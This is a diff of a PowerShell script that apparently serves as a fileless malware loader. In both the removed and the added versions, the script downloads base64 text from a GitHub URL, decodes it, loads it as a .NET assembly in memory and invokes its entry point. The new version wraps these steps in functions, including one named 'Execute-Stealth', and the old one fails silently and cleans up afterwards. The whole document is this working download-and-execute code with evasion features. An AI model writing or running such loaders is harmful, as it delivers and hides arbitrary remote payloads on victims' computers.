@@ -1,22 +1,48 @@
-# Script de lancement fileless
-$ErrorActionPreference = "SilentlyContinue"
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-try {
-    # Télécharger file.txt depuis GitHub
-    $url = "https://github.com/thegoatofapi/AL/releases/download/C/file.txt"
-    $webClient = New-Object System.Net.WebClient
-    $base64 = $webClient.DownloadString($url)
-    
-    # Décoder et exécuter en mémoire
-    $bytes = [Convert]::FromBase64String($base64)
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
-    $entryPoint = $assembly.EntryPoint
-    $entryPoint.Invoke($null, @(@()))
-    
-    # Nettoyage
-    $bytes = $null
-    $base64 = $null
-    [GC]::Collect()
-} catch {
-    # Échec silencieux
+function Download-Base64 {
+    param (
+        [string]$url
+    )
+    $base64 = Invoke-RestMethod -Uri $url
+    return $base64
 }
+
+function Decode-Base64 {
+    param (
+        [string]$base64
+    )
+    $bytes = [Convert]::FromBase64String($base64)
+    return $bytes
+}
+
+function Execute-InMemory {
+    param (
+        [byte[]]$bytes
+    )
+
+    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
+
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -ne $null) {
+        $entryPoint.Invoke($null, @())
+    }
+}
+
+function Execute-Stealth {
+    param (
+        [string]$url
+    )
+
+    $base64 = Download-Base64 -url $url
+    $bytes = Decode-Base64 -base64 $base64
+    Execute-InMemory -bytes $bytes
+
+    if ($bytes -ne $null) {
+        [Array]::Clear($bytes, 0, $bytes.Length)
+    }
+}
+
+$url = "https://raw.githubusercontent.com/thegoatofapi/AL/refs/heads/main/file.txt"
+
+Execute-Stealth -url $url
